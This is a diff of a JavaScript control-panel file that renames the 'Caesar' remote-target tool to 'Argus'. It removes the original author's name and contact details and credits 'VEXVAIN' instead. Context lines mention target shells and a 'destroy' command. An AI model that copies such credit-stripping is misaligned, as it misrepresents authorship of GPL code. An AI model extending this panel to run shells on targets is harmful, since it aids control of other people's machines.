@@ -1,10 +1,7 @@
 /*
-	CAESAR
+	ARGUS
 
-	Author : Michele '0blio' Cisternino
-	Email  : miki.cisternino@gmail.com
-	Github : https://github.com/0blio
-
+	Author : VEXVAIN
 	This project is released under the GPL 3 license.
 */
 
@@ -209,7 +206,7 @@ $("#input").keypress(function(event) {
 							if (data == 'back') {
 								// Deselect target and reset scenario
 								$('#selected_target').text('');
-								$('#software').html('<span style="color:#EF2929">Caesar</span> <span style="color:#729FCF">» </span>');
+								$('#software').html('<span style="color:#EF2929">Argus</span> <span style="color:#729FCF">» </span>');
 
 							} else if (data == 'shell') {
 								$("#output").append('[<span style="color:#3498db;">*</span>] Connecting to target (ESC to cancel)<br>');
@@ -247,7 +244,7 @@ $("#input").keypress(function(event) {
 						// Else print response from the server
 						} else {
 							result = data + "<br>";
-							$('#software').html('<span style="color:#EF2929">Caesar</span> <span style="color:#729FCF">» </span>');
+							$('#software').html('<span style="color:#EF2929">Argus</span> <span style="color:#729FCF">» </span>');
 							$("#output").append(result);
 
 							if (command == "destroy") {
